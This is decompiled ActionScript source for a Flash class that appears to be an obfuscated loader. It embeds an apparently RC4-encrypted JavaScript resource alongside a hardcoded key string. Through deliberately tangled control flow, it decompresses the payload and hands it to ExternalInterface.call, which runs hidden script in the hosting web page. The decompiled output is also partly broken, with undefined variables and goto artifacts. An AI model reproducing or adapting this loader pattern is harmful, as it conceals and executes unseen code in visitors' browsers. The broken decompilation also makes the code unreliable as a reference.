package Res
{
   import flash.external.ExternalInterface;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   
   public final class Res
   {
       
      private var m_myClass07:Class;
      
      private var m_myStr08:String;
      
      public function Res(param1:Function, param2:Function)
      {
         if(!_loc5_)
         {
            m_myClass07 = res_js_rc4$9d60ea8c42cd5afde749de7143478f03135771611;
            if(!_loc6_)
            {
               if(_loc5_)
               {
                  loop0:
                  while(true)
                  {
                     ExternalInterface.addCallback("onSuccess",param1);
                     if(!_loc5_)
                     {
                        if(_loc6_)
                        {
                           addr53:
                           while(true)
                           {
                              this.m_myStr08 = "edfdamtlkfg511485";
                              if(!_loc5_)
                              {
                                 if(!_loc5_)
                                 {
                                    if(!_loc5_)
                                    {
                                       continue loop0;
                                    }
                                 }
                              }
                              break;
                           }
                        }
                        addr97:
                        ExternalInterface.addCallback("onFailed",param2);
                     }
                  }
               }
               while(true)
               {
                  super();
               }
            }
            while(true)
            {
               if(_loc5_)
               {
                  §§goto(addr97);
               }
               else
               {
                  §§goto(addr53);
               }
            }
         }
         if(!_loc6_)
         {
         }
         if(!_loc6_)
         {
            _loc3_.uncompress("deflate");
         }
         var _loc4_:String = _loc3_.toString();
         if(!_loc6_)
         {
            ExternalInterface.call("function (){" + _loc4_ + "}");
         }
      }
   }
}
